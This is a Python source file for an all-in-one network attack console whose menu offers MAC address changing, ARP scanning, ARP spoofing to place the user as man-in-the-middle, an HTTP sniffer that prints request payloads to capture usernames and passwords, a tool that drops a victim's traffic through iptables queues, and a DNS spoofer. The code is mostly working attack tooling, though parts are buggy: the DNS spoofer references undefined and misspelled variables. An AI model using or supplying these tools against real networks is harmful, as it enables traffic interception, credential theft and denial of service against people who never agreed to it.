import scapy.all as scapy
import netfilterqueue
import time
import pyfiglet
import http as server
import subprocess
import sys

from mac_vendor_lookup import MacLookup
from prettytable import PrettyTable
from scapy.layers import http

def start_text():
    intro_text_1 = pyfiglet.figlet_format('BH\nkonsole', font='5lineoblique')
    intro_text_2 = pyfiglet.figlet_format('by zvado', font='digital')

    print(intro_text_1)
    print(intro_text_2)

start_text()

class Mac_change:
    def __init__(self,id ,name, info):
        self.id = id
        self.name = name
        self.info = info
    def _method_(self, *args):
        print(f'[+] Tool started!')

        try:
            options = args[0]
            interface = options[0]
            new_mac = options[1]
        except IndexError:
            print('[-] Check if options are correct. [interface new_mac]')

        commands_1 = ['ifconfig', interface, 'down']
        commands_2 = ['ifconfig',  interface, 'hw', 'ether', new_mac]
        commands_3 = ['ifconfig', interface, 'up']

        subprocess.call(commands_1)
        print(f'[+] Interface {interface} down')
        subprocess.call(commands_2)
        print(f'[+] Changing MAC address to new one')
        subprocess.call(commands_3)
        print(f'[+] MAC address changed to {new_mac}.')

class Net_detect:
    def __init__(self,id ,name, info):
        self.id = id
        self.name =  name
        self.info = info
    def _method_(self, *args):

        try:
            options = args[0]
            ip = options[0]
        except IndexError:
            print('[-] Check if options are correct. [ip/24]')

        arpRequest = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arpRequestBroadcast = broadcast/arpRequest
        answered = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]

        print("IP\t\t\tMAC Address\t\t\tVendor\n-----------------------------------------------------------")
        for el in answered:
            print(el[1].psrc + "\t\t" + el[1].hwsrc + "\t\t" + MacLookup().lookup(el[1].hwsrc))


class Net_spoof:
    def __init__(self, id, name, info):
        self.id = id
        self.name = name
        self.info = info
    def _method_(self, *args):
        try:
            parsed_args = args[0]
            targetIp = parsed_args[0]
            routerIp = parsed_args[1]
        except IndexError:
            print('[-] Check if options are correct. [targetIP routerIP]')
            print(type(args))
            read_command()

        arpRequest = scapy.ARP(pdst=targetIp)
        broadcast =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arpRequestBroadcast = broadcast/arpRequest
        answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]

        counter = 0
        while True:
            targetMac = answeredList[0][1].hwsrc
            packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=routerIp)
            scapy.send(packet, verbose=False)
            counter += 2
            print(f'[+] Packets sent --- {counter}')
            time.sleep(2)

class Sniffer:
    def __init__(self, id, name, info):
        self.id = id
        self.name = name
        self.info = info
    def _method_(self, *args):

        try:
            interface = args[0]
        except IndexError:
            print('[-] Check if options are correct.\n [interface]')

        def sniff(interface):
            scapy.sniff(iface=interface, store=False, prn=processPacket)

        def processPacket(packet):
            if packet.haslayer(http.HTTPRequest):
                url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
                print(url)
                if packet.haslayer(scapy.Raw):
                    load = packet[scapy.Raw].load
                    keywords = ["username, user, usr, login, password, pass, pswd"]
                    for keyword in keywords:
                        print(load)
                        break

        sniff(interface)


class Net_stop:
    def __init__(self, id, name, info):
        self.id = id
        self.name = name
        self.info = info
    def _method_(self, *args):
        try:
            parsed_args = args[0]
            queueNum = parsed_args[0]
        except IndexError:
            print('[-] Check if options are correct.\n [queue_num]')
            read_command()

        def createQueue(queueNum):
            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queueNum])
            print("Queue created")

        def processPacket(packet):
            print(packet)
            packet.drop()

        createQueue(queueNum)
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(int(queueNum), processPacket)
        queue.run()


class Dns_spoof:
    def __init__(self, id, name, info):
        self.id = id
        self.name = name
        self.info = info
    def _method_(self, *args):

        try:
            parsed_args = args[0]
            queueNum = parsed_args[0]
            host = parsed_args[1]
            rhsot = parsed_args[2]
            test = parsed_args[3]
        except IndexError:
            print('[-] Check if options are correct.\n [host rhost test]')
            read_command

        def createQueue(queueNum, test):
            if test == 0:
                subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queueNum])
                print("Queue created!")
            if test == 1:
                subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", queueNum])
                subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", queueNum])
                print("Test queue created!")

        def processPacket(packet):

            if scapyPacket.haslayer(scapy.DNSRR):
                qname = scapyPacket[scapy.DNSQR].qname
                if host in qname:
                    print(qname)
                    answer = scapy.DNSRR(rrname=qname, rdata=rhost)
                    scapyPacket[scapy.DNS].an = answer
                    scapyPacket[scapy.DNS].ancount = 1

                    del scapyPacket[scapy.IP].len
                    del scapyPacket[scapy.IP].chksum
                    del scapyPacket[scapy.UDP].chksum
                    del scapyPacket[scapy.UDP].chksum

                    packet.set_payload(str(scapyPacket))

            packet.accept()


        createQueue(queueNum, int(test))
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(int(queueNum), processPacket)
        queue.run()



def set_tools():
    info_mac_change = 'Changes your MAC address\n options are interface and new_mac.'
    info_net_detect = 'Detects all devices in the network\n options are yourIP/24'
    info_net_spoof = 'Spoofs the target IP and the router to become man in the midle\n options are targetIp and routerIP'
    info_sniffer = 'Sniffs the spoofed target for passwords and urls.'
    info_net_stop = 'After you become man in the midle with spoofer you can create queue to hold packets and drop them stopping the connection between the target and the router. After use make sure you purge your ip tables'
    info_dns_spoof = 'Spoofs DNS request'

    mac_change = Mac_change(0,'mac_change', info_mac_change)
    net_detect  = Net_detect(1,'net_detect', info_net_detect)
    net_spoof = Net_spoof(2, 'net_spoof', info_net_spoof)
    sniffer = Sniffer(3, 'sniffer', info_sniffer)
    net_stop = Net_stop(4, 'net_stop', info_net_stop)
    dns_spoof = Dns_spoof(5, 'dns_spoof', info_dns_spoof)

    return [mac_change, net_detect, net_spoof, sniffer, net_stop, dns_spoof]

def display_tools():
    tools = set_tools()
    for tool in tools:
        print(f'{tool.id} - {tool.name}')
    event = True

def display_info(command_input):

    try:
        split_command = command_input.split()
        tool_number = int(split_command[1])
        print(set_tools()[tool_number].info)
    except IndexError:
        print('[-] Check if you inputed tool number to read info')
        read_command()


def display_commands():
    help_table = PrettyTable(['Commands', 'Actions', 'Example'])
    help_table.add_row(['show', 'Lists all tools', 'show'])
    help_table.add_row(['help', 'Lists commands', 'help'])
    help_table.add_row(['run', 'Run a tool by selecting a number', 'run 0'])
    help_table.add_row(['info', 'Information about paricular tool', 'info 0'])
    help_table.add_row(['bye', 'Exit the programm', 'bye'])
    print(help_table)

def display_help():
    print('To use the tool list all commands type commands')
    print('This is all in one tool made by zvado.')
    print('This tool is made so people can learn hacking and pen testing.')

def exit():
    print('\n bye :p')
    sys.exit()

def options_list(list_command):
    options = []
    for index in range(2, len(list_command)):
       command = list_command[index]
       options.append(command)
    return options

def event_builder(command):
    event = []
    try:
        list_command = command.split()
        tool_number = list_command[1]
        options = options_list(list_command)
        event.append(tool_number)
        event.append(options)
    except IndexError:
        print('[-] Input tool number.')
        read_command()

    return event


def event_parser(event):
    try:
        options = event[1]
        tool = int(event[0])
        print(f'Options: {options}')
        print(f'Tool Name: {set_tools()[tool].name}')

    except IndexError:
        print('[-] The tool number dosent exist')

    return [tool, options]

def run_tools(parsed_event):
    tool = parsed_event[0]
    options = parsed_event[1]

    set_tools()[tool]._method_(options)
    # fix IndexError of tools

def read_command():
    set_tools()
    try:
        command_input = input('->> ')
    except KeyboardInterrupt:
        exit()
    #check what is the command
    if command_input == 'show':
        display_tools()
    if command_input == 'help':
        display_help()
    if command_input == 'commands':
        display_commands()
    if command_input == 'bye':
        exit()
    if 'run'in command_input:
        event = event_builder(command_input)
        parsed_event = event_parser(event)
        run_tools(parsed_event)
    if 'info' in command_input:
        display_info(command_input)

while True:
    read_command()


